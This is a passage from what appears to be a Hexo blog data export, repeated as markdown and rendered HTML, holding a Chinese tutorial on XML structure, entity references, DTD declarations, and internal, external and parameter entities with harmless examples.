then</message>\n```\n\n为了避免这个错误，用**实体引用**来代替 \"<\" 字符：\n\n```xml\n<message>if salary &lt; 1000 then</message>\n```\n\nXML有5个预定义的实体引用：\n\n![](xml\\QQ截图20190228152213.png)\n\n## 0x02 DTD\n\n文档类型定义（DTD）可定义合法的XML文档构建模块。\n\n**1.为什么使用DTD？**\n\n通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。\n\n通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。\n\n还可以用DTD 来验证从外部接收到的、自身的数据。\n\n**2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。**\n\ni.在文档内声明的栗子：`<!DOCTYPE root-element [element-declarations]>`\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    #定义此文档是 note 类型的文档。\n  <!ELEMENT note (to,from,heading,body)>   #定义note元素有四个元素：\"to、from、heading、body\"\n  <!ELEMENT to (#PCDATA)>\n  <!ELEMENT from (#PCDATA)>\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body (#PCDATA)>   #定义body元素为\"#PCDATA\"类型\n]>\n<note>\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend</body>\n</note>\n```\n\nii.作为外部引用的例子：`<!DOCTYPE root-element SYSTEM \"filename\">`\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"note.dtd\">  #引用外部文件note.dtd\n<note>\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend!</body>\n</note>\n```\n\n`note.dtd`文件内容：\n\n```xml-dtd\n<!ELEMENT note (to,from,heading,body)>\n<!ELEMENT to (#PCDATA)>\n<!ELEMENT from (#PCDATA)>\n<!ELEMENT heading (#PCDATA)>\n<!ELEMENT body (#PCDATA)>\n```\n\n**3.DTD实体**\n\n**实体**是用于定义引用普通文本或特殊字符的快捷方式的变量。\n\n**实体引用**是对实体的引用。引用后会获得实体指向的实际数据。\n\n**实体声明也是在DTD声明中，与元素声明同级。**\n\ni.在文档内部声明实体的例子：`<!ENTITY entity-name \"entity-value\">`\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   #定义note元素可以有任意元素。\n  \n  <!ENTITY entity1 \"Be\">      #文档内声明\n  <!ENTITY entity2 \"back.\">\n]>\n<note>&entity1; &entity2;</note>\n```\n\nii.外部声明引用实体的例子：`<!ENTITY entity-name SYSTEM \"URI/URL\">` or `<!DOCTYPE 根元素 PUBLIC \"public_ID\" \"文件名\">`\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   \n  \n  <!ENTITY entity1 SYSTEM \"http://www.sakuxa.com/example.xml\">  #system关键字表示外部引用\n]>\n<note> &entity1;</note>\n```\n\niii.参数实体\n\n参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。\n\n**记住：%entity; 会被它指向的数据进行直接替换。**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   \n  \n  <!ENTITY % entity1 SYSTEM \"http://www.sakuxa.com/example.dtd\">\n  %entity1  #会被example.dtd内容替换\n]>\n<note> &entity2;</note>\n```\n\n`example.dtd`文件内容：\n\n```xml-dtd\n<!ENTITY entity2 \"Be back.\">\n```\n\n**注意：** 一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。","slug":"xml","published":1,"updated":"2019-03-22T03:57:01.066Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83l5002q7or0bjoinvub","content":"<h2 id=\"0x00-XML概述\"><a href=\"#0x00-XML概述\" class=\"headerlink\" title=\"0x00 XML概述\"></a>0x00 XML概述</h2><ul>\n<li>XML 指可扩展标记语言（eXtensible Markup Language）。</li>\n<li>XML 的设计宗旨是传输数据，而不是显示数据。</li>\n<li>XML 标签没有被预定义。</li>\n<li>XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。</li>\n</ul>\n<blockquote>\n<p>XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。</p>\n</blockquote>\n<a id=\"more\"></a>\n<p><strong>XML与HTML</strong></p>\n<p>1.XML 和 HTML 为不同的目的而设计：</p>\n<blockquote>\n<ul>\n<li>XML 被设计用来传输和存储数据。</li>\n<li>HTML 被设计用来显示数据。</li>\n</ul>\n</blockquote>\n<p>2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。</p>\n<p><strong>3.XML 是独立于软件和硬件的信息传输工具。</strong></p>\n<h2 id=\"0x01-XML结构\"><a href=\"#0x01-XML结构\" class=\"headerlink\" title=\"0x01 XML结构\"></a>0x01 XML结构</h2><blockquote>\n<p>XML文档是树形结构的，由根元素扩展，且必须包含根元素。</p>\n</blockquote>\n<p><strong>一个栗子:</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span> <span class=\"attr\">date</span>=<span class=\"string\">\"9102/2/28\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Mikasa<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Allen<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don't forget me this weekend!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一行是XML声明，指定XML版本以及编码方式，声明是可选的。</li>\n<li><code>&lt;note&gt;</code>为根元素，XML标签都是成对且闭合的，以<code>&lt;/note&gt;</code>闭合标签。</li>\n<li>XML是大小写敏感的，<code>&lt;note&gt;</code>与<code>&lt;Note&gt;</code>是不同的标签。</li>\n<li>标签是可以设置属性的，如例子中<code>&lt;note&gt;</code>标签的<code>date</code>，但是属性的值必须使用引号括起来。</li>\n</ul>\n<p><strong>实体引用：</strong></p>\n<p>在 XML 中，一些字符拥有特殊的意义。</p>\n<p>例如，如果把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 使用下面会发生错误 --&gt;</span></span><br><span class=\"line\">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>\n<p>为了避免这个错误，用<strong>实体引用</strong>来代替 “&lt;” 字符：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span>&gt;</span>if salary &amp;lt; 1000 then<span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>XML有5个预定义的实体引用：</p>\n<p><img src=\"/2019/02/28/xml/QQ截图20190228152213.png\" alt></p>\n<h2 id=\"0x02-DTD\"><a href=\"#0x02-DTD\" class=\"headerlink\" title=\"0x02 DTD\"></a>0x02 DTD</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块。</p>\n<p><strong>1.为什么使用DTD？</strong></p>\n<p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p>\n<p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>\n<p>还可以用DTD 来验证从外部接收到的、自身的数据。</p>\n<p><strong>2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p>\n<p>i.在文档内声明的栗子：<code>&lt;!DOCTYPE root-element [element-declarations]&gt;</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    #定义此文档是 note 类型的文档。</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note (to,from,heading,body)&gt;   #定义note元素有四个元素：\"to、from、heading、body\"</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT to (#PCDATA)&gt;</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT from (#PCDATA)&gt;</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT body (#PCDATA)&gt;   #定义body元素为\"#PCDATA\"类型</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Mikasa<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Allen<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don't forget me this weekend<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ii.作为外部引用的例子：<code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt;</span>  #引用外部文件note.dtd</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Mikasa<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Allen<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don't forget me this weekend!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>note.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class=\"line\">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>3.DTD实体</strong></p>\n<p><strong>实体</strong>是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>\n<p><strong>实体引用</strong>是对实体的引用。引用后会获得实体指向的实际数据。</p>\n<p><strong>实体声明也是在DTD声明中，与元素声明同级。</strong></p>\n<p>i.在文档内部声明实体的例子：<code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note ANY&gt;   #定义note元素可以有任意元素。</span></span><br><span class=\"line\"><span class=\"meta\">  </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY entity1 \"Be\"&gt;      #文档内声明</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY entity2 \"back.\"&gt;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span>&amp;entity1; &amp;entity2;<span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ii.外部声明引用实体的例子：<code>&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</code> or <code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note ANY&gt;   </span></span><br><span class=\"line\"><span class=\"meta\">  </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY entity1 SYSTEM \"http://www.sakuxa.com/example.xml\"&gt;  #system关键字表示外部引用</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;entity1;<span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>iii.参数实体</p>\n<p>参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。</p>\n<p><strong>记住：%entity; 会被它指向的数据进行直接替换。</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note ANY&gt;   </span></span><br><span class=\"line\"><span class=\"meta\">  </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY % entity1 SYSTEM \"http://www.sakuxa.com/example.dtd\"&gt;</span></span><br><span class=\"line\"><span class=\"meta\">  %entity1  #会被example.dtd内容替换</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span> &amp;entity2;<span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>example.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY entity2 &quot;Be back.&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>注意：</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-XML概述\"><a href=\"#0x00-XML概述\" class=\"headerlink\" title=\"0x00 XML概述\"></a>0x00 XML概述</h2><ul>\n<li>XML 指可扩展标记语言（eXtensible Markup Language）。</li>\n<li>XML 的设计宗旨是传输数据，而不是显示数据。</li>\n<li>XML 标签没有被预定义。</li>\n<li>XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。</li>\n</ul>\n<blockquote>\n<p>XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。</p>\n</blockquote>","more":"<p><strong>XML与HTML</strong></p>\n<p>1.XML 和 HTML 为不同的目的而设计：</p>\n<blockquote>\n<ul>\n<li>XML 被设计用来传输和存储数据。</li>\n<li>HTML 被设计用来显示数据。</li>\n</ul>\n</blockquote>\n<p>2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。</p>\n<p><strong>3.XML 是独立于软件和硬件的信息传输工具。</strong></p>\n<h2 id=\"0x01-XML结构\"><a href=\"#0x01-XML结构\" class=\"headerlink\" title=\"0x01 XML结构\"></a>0x01 XML结构</h2><blockquote>\n<p>XML文档是树形结构的，由根元素扩展，且必须包含根元素。</p>\n</blockquote>\n<p><strong>一个栗子:</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span> <span class=\"attr\">date</span>=<span class=\"string\">\"9102/2/28\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Mikasa<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Allen<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don't forget me this weekend!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一行是XML声明，指定XML版本以及编码方式，声明是可选的。</li>\n<li><code>&lt;note&gt;</code>为根元素，XML标签都是成对且闭合的，以<code>&lt;/note&gt;</code>闭合标签。</li>\n<li>XML是大小写敏感的，<code>&lt;note&gt;</code>与<code>&lt;Note&gt;</code>是不同的标签。</li>\n<li>标签是可以设置属性的，如例子中<code>&lt;note&gt;</code>标签的<code>date</code>，但是属性的值必须使用引号括起来。</li>\n</ul>\n<p><strong>实体引用：</strong></p>\n<p>在 XML 中，一些字符拥有特殊的意义。</p>\n<p>例如，如果把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 使用下面会发生错误 --&gt;</span></span><br><span class=\"line\">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>\n<p>为了避免这个错误，用<strong>实体引用</strong>来代替 “&lt;” 字符：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span>&gt;</span>if salary &amp;lt; 1000 then<span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>XML有5个预定义的实体引用：</p>\n<p><img src=\"/2019/02/28/xml/QQ截图20190228152213.png\" alt></p>\n<h2 id=\"0x02-DTD\"><a href=\"#0x02-DTD\" class=\"headerlink\" title=\"0x02 DTD\"></a>0x02 DTD</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块。</p>\n<p><strong>1.为什么使用DTD？</strong></p>\n<p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p>\n<p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>\n<p>还可以用DTD 来验证从外部接收到的、自身的数据。</p>\n<p><strong>2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p>\n<p>i.在文档内声明的栗子：<code>&lt;!DOCTYPE root-element [element-declarations]&gt;</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    #定义此文档是 note 类型的文档。</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note (to,from,heading,body)&gt;   #定义note元素有四个元素：\"to、from、heading、body\"</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT to (#PCDATA)&gt;</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT from (#PCDATA)&gt;</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT body (#PCDATA)&gt;   #定义body元素为\"#PCDATA\"类型</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Mikasa<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Allen<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don't forget me this weekend<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ii.作为外部引用的例子：<code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt;</span>  #引用外部文件note.dtd</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Mikasa<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Allen<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don't forget me this weekend!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>note.dtd</code>文件内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class=\"line\">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>3.DTD实体</strong></p>\n<p><strong>实体</strong>是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>\n<p><strong>实体引用</strong>是对实体的引用。引用后会获得实体指向的实际数据。</p>\n<p><strong>实体声明也是在DTD声明中，与元素声明同级。</strong></p>\n<p>i.在文档内部声明实体的例子：<code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note [    </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ELEMENT note ANY&gt;   #定义note元素可以有任意元素。</span></span><br><span class=\"line\"><span class=\"meta\">  </span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY entity1 \"Be\"&gt;      #文档内声明</span></span><br><span class=\"line\"><span class=\"meta\">  &lt;!ENTITY entity2 \"back.\"&gt;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span>&amp;entity1; &amp;entity2;<span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ii.外部声明引用实体的例子：<code>&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</code> or <code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span 